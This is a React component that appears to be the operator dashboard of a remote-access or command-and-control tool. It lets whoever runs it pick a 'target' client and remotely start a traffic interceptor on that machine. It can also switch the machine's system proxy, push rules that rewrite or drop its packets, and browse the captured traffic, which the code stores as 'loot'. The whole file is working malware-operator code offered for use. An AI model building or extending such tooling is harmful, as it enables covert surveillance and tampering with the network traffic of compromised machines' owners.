'use client'

import { useState, useEffect, useCallback } from 'react'
import { 
  Network, 
  Activity, 
  Shield, 
  Zap, 
  Settings, 
  Lock, 
  ArrowUpRight, 
  ArrowDownLeft, 
  Trash2, 
  RefreshCw, 
  Plus, 
  Play, 
  Square,
  Eye,
  Filter,
  Check,
  AlertCircle
} from 'lucide-react'
import { Card, CardContent, CardTitle, CardDescription, CardHeader } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'

interface NetworkInterceptorPanelProps {
  selectedClient: string | null
}

interface PacketRule {
  pattern: string
  replacement: string
  action: 'replace' | 'drop' | 'log'
  port?: number
}

interface PacketLog {
  ts: number
  dst: string
  dir: 'IN' | 'OUT'
  sz: number
  data: string // base64
}

export default function NetworkInterceptorPanel({ selectedClient }: NetworkInterceptorPanelProps) {
  const [isRunning, setIsRunning] = useState(false)
  const [isMonitoring, setIsMonitoring] = useState(false)
  const [isIntercepting, setIsIntercepting] = useState(false)
  const [isSystemProxy, setIsSystemProxy] = useState(false)
  const [rules, setRules] = useState<PacketRule[]>([])
  const [logs, setLogs] = useState<PacketLog[]>([])
  const [isLoadingLogs, setIsLoadingLogs] = useState(false)
  const [newRule, setNewRule] = useState<PacketRule>({ pattern: '', replacement: '', action: 'replace' })
  const [port, setPort] = useState(1080)

  // Fetch status
  const fetchStatus = useCallback(async () => {
    if (!selectedClient) return
    try {
      const resp = await fetch(`/api/commands?action=history&clientId=${selectedClient}`)
      if (resp.ok) {
        const history = await resp.json()
        // Find latest interception status command
        const statusCmd = history.find((c: any) => c.command_name === 'interception' && c.status === 'completed')
        if (statusCmd && statusCmd.result) {
          try {
            const res = JSON.parse(statusCmd.result)
            if (res.running !== undefined) {
              setIsRunning(res.running)
              setIsMonitoring(res.monitoring)
              setIsIntercepting(res.intercepting)
            }
          } catch (e) {}
        }
      }
    } catch (e) {}
  }, [selectedClient])

  // Fetch logs from loot
  const fetchLogs = useCallback(async () => {
    if (!selectedClient) return
    setIsLoadingLogs(true)
    try {
      const resp = await fetch(`/api/loot?client=${selectedClient}&type=packets`)
      if (resp.ok) {
        const { data: files } = await resp.json()
        if (files && files.length > 0) {
          // Get the latest log file
          const latestFile = files.sort((a: any, b: any) => b.created_at.localeCompare(a.created_at))[0]
          const contentResp = await fetch(`/api/loot/view?id=${latestFile.id}`)
          if (contentResp.ok) {
            const text = await contentResp.text()
            const lines = text.trim().split('\n')
            const parsedLogs = lines.map(line => {
              try { return JSON.parse(line) } catch (e) { return null }
            }).filter(l => l !== null)
            setLogs(parsedLogs.reverse()) // Latest first
          }
        }
      }
    } catch (e) {
      console.error('Error fetching logs:', e)
    } finally {
      setIsLoadingLogs(false)
    }
  }, [selectedClient])

  useEffect(() => {
    if (selectedClient) {
      fetchStatus()
      fetchLogs()
      const interval = setInterval(() => {
        fetchStatus()
        fetchLogs()
      }, 5000)
      return () => clearInterval(interval)
    }
  }, [selectedClient, fetchStatus, fetchLogs])

  const executeAction = async (action: string, params: any = {}) => {
    if (!selectedClient) return
    try {
      const resp = await fetch('/api/commands', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          client_id: selectedClient,
          command_type: 'execution',
          command_name: 'interception',
          parameters: { action, ...params }
        })
      })
      const data = await resp.json()
      if (resp.ok) {
        await fetch('/api/execute', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            commandId: data.id,
            clientId: selectedClient,
            commandType: 'execution',
            commandName: 'interception',
            parameters: { action, ...params }
          })
        })
        fetchStatus()
      }
    } catch (e) {}
  }

  const addRule = () => {
    if (!newRule.pattern) return
    const updatedRules = [...rules, newRule]
    setRules(updatedRules)
    executeAction('set_rules', { rules: updatedRules })
    setNewRule({ pattern: '', replacement: '', action: 'replace' })
  }

  const removeRule = (index: number) => {
    const updatedRules = rules.filter((_, i) => i !== index)
    setRules(updatedRules)
    executeAction('set_rules', { rules: updatedRules })
  }

  if (!selectedClient) {
    return (
      <div className="flex items-center justify-center h-full">
        <Card className="p-12 text-center max-w-md bg-card/50 border-dashed">
          <Network className="w-12 h-12 mx-auto mb-4 text-muted-foreground opacity-50" />
          <CardTitle className="mb-2">No Target Selected</CardTitle>
          <CardDescription>Select a client node to initialize the Network Interception Engine</CardDescription>
        </Card>
      </div>
    )
  }

  return (
    <div className="p-6 space-y-6 h-full flex flex-col max-w-[1600px] mx-auto">
      {/* Header with Engine Status */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h1 className="text-3xl font-black text-foreground flex items-center gap-3 tracking-tight">
            <Network className="w-8 h-8 text-primary" /> 
            NETWORK INTERCEPTOR <span className="text-[10px] font-mono text-primary/50 bg-primary/5 px-2 py-0.5 rounded border border-primary/20">V1.0-ELITE</span>
          </h1>
          <p className="text-muted-foreground text-xs font-mono mt-1 uppercase tracking-widest flex items-center gap-2">
            <Activity className="w-3 h-3 text-emerald-500 animate-pulse" /> Subsystem Online: {selectedClient.slice(0, 8)}...
          </p>
        </div>

        <div className="flex items-center gap-3">
          <Button 
            variant={isRunning ? "destructive" : "default"} 
            onClick={() => executeAction(isRunning ? 'stop' : 'start', { port })}
            className="font-bold uppercase tracking-widest text-[10px] h-10 px-6 rounded-xl shadow-lg shadow-primary/10 transition-all active:scale-95"
          >
            {isRunning ? <Square className="w-3 h-3 mr-2" /> : <Play className="w-3 h-3 mr-2" />}
            {isRunning ? 'Deactivate Engine' : 'Activate Engine'}
          </Button>
          <Button 
            variant="outline" 
            onClick={() => { fetchStatus(); fetchLogs(); }}
            className="h-10 w-10 p-0 rounded-xl border-white/10 bg-white/[0.02] hover:bg-white/5"
          >
            <RefreshCw className={`w-4 h-4 ${isLoadingLogs ? 'animate-spin' : ''}`} />
          </Button>
        </div>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-6 flex-1 min-h-0">
        {/* Left Column: Configuration & Rules */}
        <div className="space-y-6 flex flex-col min-h-0">
          {/* Controls Card */}
          <Card className="bg-black/40 border-white/5 backdrop-blur-xl shadow-2xl rounded-3xl overflow-hidden">
            <CardHeader className="pb-4">
              <CardTitle className="text-xs font-black tracking-[0.2em] uppercase text-primary/80 flex items-center gap-2">
                <Settings className="w-3.5 h-3.5" /> Engine Configuration
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-2 gap-3">
                <ControlToggle 
                  label="Monitoring" 
                  active={isMonitoring} 
                  icon={Eye}
                  onClick={() => executeAction('toggle_monitor', { enabled: !isMonitoring })}
                />
                <ControlToggle 
                  label="Interception" 
                  active={isIntercepting} 
                  icon={Shield}
                  onClick={() => executeAction('toggle_intercept', { enabled: !isIntercepting })}
                />
                <ControlToggle 
                  label="System Proxy" 
                  active={isSystemProxy} 
                  icon={Lock}
                  onClick={() => {
                    const next = !isSystemProxy;
                    setIsSystemProxy(next);
                    executeAction('system_proxy', { enabled: next, port });
                  }}
                />
                <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-4 flex flex-col justify-between hover:bg-white/[0.04] transition-all">
                  <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest">Proxy Port</span>
                  <input 
                    type="number" 
                    value={port} 
                    onChange={(e) => setPort(parseInt(e.target.value))}
                    className="bg-transparent border-none text-primary font-mono text-lg font-bold focus:outline-none w-full mt-1"
                  />
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Manipulation Rules Card */}
          <Card className="bg-black/40 border-white/5 backdrop-blur-xl shadow-2xl rounded-3xl flex-1 flex flex-col min-h-0">
            <CardHeader className="pb-4">
              <CardTitle className="text-xs font-black tracking-[0.2em] uppercase text-primary/80 flex items-center gap-2">
                <Zap className="w-3.5 h-3.5" /> Manipulation Rules
              </CardTitle>
              <CardDescription className="text-[10px] uppercase font-mono text-muted-foreground/50">Dynamic Packet Rewrite Engine</CardDescription>
            </CardHeader>
            <CardContent className="flex-1 flex flex-col min-h-0 space-y-4">
              {/* New Rule Form */}
              <div className="space-y-3 p-4 bg-white/[0.02] rounded-2xl border border-white/5">
                <div className="grid grid-cols-2 gap-3">
                  <Input 
                    placeholder="PATTERN (TEXT/HEX)" 
                    value={newRule.pattern}
                    onChange={(e) => setNewRule({...newRule, pattern: e.target.value})}
                    className="bg-black/40 border-white/10 text-[11px] font-mono rounded-xl h-10"
                  />
                  <Input 
                    placeholder="REPLACEMENT" 
                    value={newRule.replacement}
                    onChange={(e) => setNewRule({...newRule, replacement: e.target.value})}
                    className="bg-black/40 border-white/10 text-[11px] font-mono rounded-xl h-10"
                  />
                </div>
                <div className="flex gap-3">
                  <select 
                    value={newRule.action}
                    onChange={(e) => setNewRule({...newRule, action: e.target.value as any})}
                    className="flex-1 bg-black/40 border border-white/10 rounded-xl px-3 text-[10px] font-bold uppercase text-white focus:outline-none"
                  >
                    <option value="replace">REPLACE</option>
                    <option value="drop">DROP PACKET</option>
                    <option value="log">LOG ONLY</option>
                  </select>
                  <Button onClick={addRule} className="rounded-xl h-10 px-4 bg-primary text-black hover:bg-primary/90">
                    <Plus className="w-4 h-4" />
                  </Button>
                </div>
              </div>

              {/* Rules List */}
              <div className="flex-1 overflow-y-auto custom-scrollbar space-y-2 pr-2">
                {rules.length === 0 ? (
                  <div className="text-center py-8 opacity-20 flex flex-col items-center">
                    <Filter className="w-12 h-12 mb-3" />
                    <p className="text-[10px] font-black tracking-widest uppercase">No Active Rules</p>
                  </div>
                ) : (
                  rules.map((rule, idx) => (
                    <div key={idx} className="group p-3 bg-white/[0.02] hover:bg-white/[0.05] border border-white/5 rounded-xl flex items-center justify-between transition-all">
                      <div className="flex-1 min-w-0 mr-3">
                        <div className="flex items-center gap-2 mb-1">
                          <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded ${
                            rule.action === 'drop' ? 'bg-red-500/20 text-red-500' : 
                            rule.action === 'replace' ? 'bg-blue-500/20 text-blue-500' : 'bg-green-500/20 text-green-500'
                          }`}>
                            {rule.action.toUpperCase()}
                          </span>
                          {rule.port && <span className="text-[9px] font-mono text-muted-foreground">PORT:{rule.port}</span>}
                        </div>
                        <div className="text-[11px] font-mono truncate text-white/80">
                          {rule.pattern} <span className="text-primary/40 mx-1">→</span> {rule.replacement || 'NULL'}
                        </div>
                      </div>
                      <button onClick={() => removeRule(idx)} className="opacity-0 group-hover:opacity-100 p-2 text-muted-foreground hover:text-red-500 transition-all">
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  ))
                )}
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Right Column: Traffic Logs */}
        <div className="xl:col-span-2 flex flex-col min-h-0">
          <Card className="bg-black/40 border-white/5 backdrop-blur-xl shadow-2xl rounded-3xl flex-1 flex flex-col min-h-0 overflow-hidden">
            <CardHeader className="pb-4 border-b border-white/5 bg-white/[0.01]">
              <div className="flex items-center justify-between">
                <div>
                  <CardTitle className="text-xs font-black tracking-[0.2em] uppercase text-primary/80 flex items-center gap-2">
                    <Activity className="w-3.5 h-3.5" /> Traffic Uplink
                  </CardTitle>
                  <CardDescription className="text-[10px] uppercase font-mono text-muted-foreground/50">Real-time Encrypted Data Stream</CardDescription>
                </div>
                <div className="flex items-center gap-4">
                   <div className="flex items-center gap-2 text-[9px] font-bold text-muted-foreground/50 uppercase">
                      <span className="w-2 h-2 rounded-full bg-blue-500 shadow-[0_0_5px_rgba(59,130,246,0.5)]" /> OUT
                      <span className="w-2 h-2 rounded-full bg-purple-500 shadow-[0_0_5px_rgba(168,85,247,0.5)] ml-2" /> IN
                   </div>
                   <button 
                    onClick={() => setLogs([])}
                    className="text-[9px] font-bold text-muted-foreground/50 hover:text-red-500 transition-colors uppercase tracking-widest flex items-center gap-1.5"
                   >
                     <Trash2 className="w-3 h-3" /> CLEAR
                   </button>
                </div>
              </div>
            </CardHeader>
            <CardContent className="flex-1 p-0 flex flex-col min-h-0">
              <div className="flex-1 overflow-y-auto custom-scrollbar font-mono">
                <table className="w-full text-left border-collapse">
                  <thead className="sticky top-0 bg-[#0a0a0a] z-10">
                    <tr className="text-[9px] font-black text-muted-foreground/30 uppercase tracking-[0.2em] border-b border-white/5">
                      <th className="px-6 py-4">TIMESTAMP</th>
                      <th className="px-6 py-4">DIRECTION</th>
                      <th className="px-6 py-4">DESTINATION</th>
                      <th className="px-6 py-4 text-right">SIZE</th>
                      <th className="px-6 py-4">PREVIEW</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/[0.03]">
                    {logs.length === 0 ? (
                      <tr>
                        <td colSpan={5} className="py-20 text-center opacity-10">
                          <RefreshCw className="w-12 h-12 mx-auto mb-4 animate-spin-slow" />
                          <p className="text-[10px] font-black tracking-[0.5em] uppercase">Awaiting Traffic Nodes...</p>
                        </td>
                      </tr>
                    ) : (
                      logs.map((log, i) => (
                        <tr key={i} className="group hover:bg-white/[0.02] transition-colors">
                          <td className="px-6 py-3 text-[10px] text-muted-foreground/80">
                            {new Date(log.ts * 1000).toLocaleTimeString()}
                          </td>
                          <td className="px-6 py-3">
                            <span className={`inline-flex items-center gap-1 text-[10px] font-black ${log.dir === 'OUT' ? 'text-blue-400' : 'text-purple-400'}`}>
                              {log.dir === 'OUT' ? <ArrowUpRight className="w-3 h-3" /> : <ArrowDownLeft className="w-3 h-3" />}
                              {log.dir}
                            </span>
                          </td>
                          <td className="px-6 py-3 text-[11px] font-bold text-white/90">
                            {log.dst}
                          </td>
                          <td className="px-6 py-3 text-right text-[10px] font-mono text-muted-foreground/60">
                            {log.sz} B
                          </td>
                          <td className="px-6 py-3">
                            <div className="text-[10px] text-primary/40 truncate max-w-[300px] group-hover:text-primary/70 transition-colors bg-black/40 px-3 py-1.5 rounded-lg border border-white/5">
                              {atob(log.data).slice(0, 64).replace(/[^\x20-\x7E]/g, '.')}
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
              
              {/* Stats Footer */}
              <div className="p-4 bg-white/[0.01] border-t border-white/5 flex items-center justify-between text-[9px] font-black text-muted-foreground/30 uppercase tracking-[0.2em]">
                <div className="flex gap-6">
                  <span>PACKETS_LOGGED: {logs.length}</span>
                  <span>BANDWIDTH: {Math.round(logs.reduce((a, b) => a + b.sz, 0) / 1024)} KB</span>
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse" /> ENGINE_READY
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  )
}

function ControlToggle({ label, active, onClick, icon: Icon }: any) {
  return (
    <button 
      onClick={onClick}
      className={`relative overflow-hidden p-4 rounded-2xl border transition-all flex flex-col justify-between group ${
        active 
        ? 'bg-primary/10 border-primary/40 text-primary shadow-[0_0_20px_rgba(0,240,255,0.1)]' 
        : 'bg-white/[0.02] border-white/5 text-muted-foreground hover:bg-white/[0.04] hover:border-white/10'
      }`}
    >
      <div className="flex items-center justify-between w-full mb-4">
        <div className={`p-2 rounded-xl ${active ? 'bg-primary/20' : 'bg-white/5'}`}>
          <Icon className="w-4 h-4" />
        </div>
        {active && <Check className="w-4 h-4" />}
      </div>
      <div className="text-left">
        <p className="text-[9px] font-black uppercase tracking-widest opacity-50 mb-0.5">{label}</p>
        <p className="text-[11px] font-bold uppercase">{active ? 'ENABLED' : 'DISABLED'}</p>
      </div>
      {/* Decorative gradient overlay */}
      {active && <div className="absolute inset-0 bg-gradient-to-tr from-primary/5 to-transparent pointer-events-none" />}
    </button>
  )
}
